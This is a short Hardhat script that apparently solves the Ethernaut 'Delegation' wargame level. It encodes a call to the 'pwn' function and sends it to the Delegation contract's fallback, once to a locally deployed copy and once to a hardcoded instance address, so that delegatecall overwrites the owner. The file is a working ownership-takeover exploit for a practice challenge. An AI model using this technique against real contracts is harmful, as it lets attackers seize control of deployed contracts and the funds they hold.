import { ethers } from "hardhat";

// Run on localhost
async function handleTest() {
  const [me, deployer] = await ethers.getSigners();

  const delegateFactory = await ethers.getContractFactory("Delegate");
  const delegate = await delegateFactory
    .connect(deployer)
    .deploy(deployer.address);

  const delegationFactory = await ethers.getContractFactory("Delegation");
  const delegation = await delegationFactory
    .connect(deployer)
    .deploy(await delegate.getAddress());

  const jsonAbi =
    require("../../artifacts/contracts/ethernaut/Delegate.sol/Delegate.json").abi;

  const iface = new ethers.Interface(jsonAbi);

  const encodedData = iface.encodeFunctionData("pwn");

  await me.sendTransaction({
    to: await delegation.getAddress(),
    data: encodedData,
  });
}

async function handleReal() {
  const [me] = await ethers.getSigners();

  const jsonAbi =
    require("../../artifacts/contracts/ethernaut/Delegate.sol/Delegate.json").abi;

  const iface = new ethers.Interface(jsonAbi);

  const encodedData = iface.encodeFunctionData("pwn");

  const tx = await me.sendTransaction({
    to: "0x343c8200465714D0A04029D9f5837Fa6C1b39f98",
    data: encodedData,
    gasLimit: 100000,
  });
  await tx.wait();
}

// handleTest().catch((error) => {
handleReal().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
